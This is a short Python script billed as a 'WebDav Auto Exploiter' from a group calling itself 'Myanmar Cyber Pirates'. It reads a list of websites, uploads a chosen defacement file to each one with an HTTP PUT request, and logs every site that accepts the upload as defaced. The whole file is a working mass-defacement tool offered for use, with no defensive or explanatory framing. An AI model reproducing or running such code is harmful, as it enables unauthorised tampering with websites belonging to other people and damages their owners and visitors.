import requests
import os
from colorama import Fore,Style

def banner():
	os.system('clear')
	print('''\t××××××××××××××××××××××××××××××××××××''')
	print('''\t×                                  ×''')
	print('''\t×      WebDav Auto Exploiter       ×''')
	print('''\t×  Myanmar Cyber Pirates 2nd-gen   ×''')
	print('''\t×         Coded By X-Ray           ×''')
	print('''\t×                                  ×''')
	print('''\t××××××××××××××××××××××××××××××××××××''')
	#Don't Change logo :3
def main():
	list=input(" Enter your sites list:: ")
	opened=open(list,"r")
	d=input(" Enter deface file:: ")#place your deface file in the same Directory
	data=open(d).read()
	d="/"+d
	for i in opened:
		try:
			i=i.strip()
			if 'http://' not in i:
				i='http://'+i
			req=requests.Session().put(i+d,data=data)
			if req.status_code==200:
				print(Fore.CYAN,"Success==>",Style.RESET_ALL,i+d)
				f=open("success.txt","a")
				f.write(i+d+"\n")
				f.close()
			else:
				print(Fore.MAGENTA,"Fail==>",Style.RESET_ALL,i+d)
		except  requests.exceptions.RequestException:
			continue

banner()
main()
print('\n',Fore.CYAN,'  [+]',Style.RESET_ALL,'Deafced Sites are saved as success.txt',Fore.CYAN,'[+]',Style.RESET_ALL)
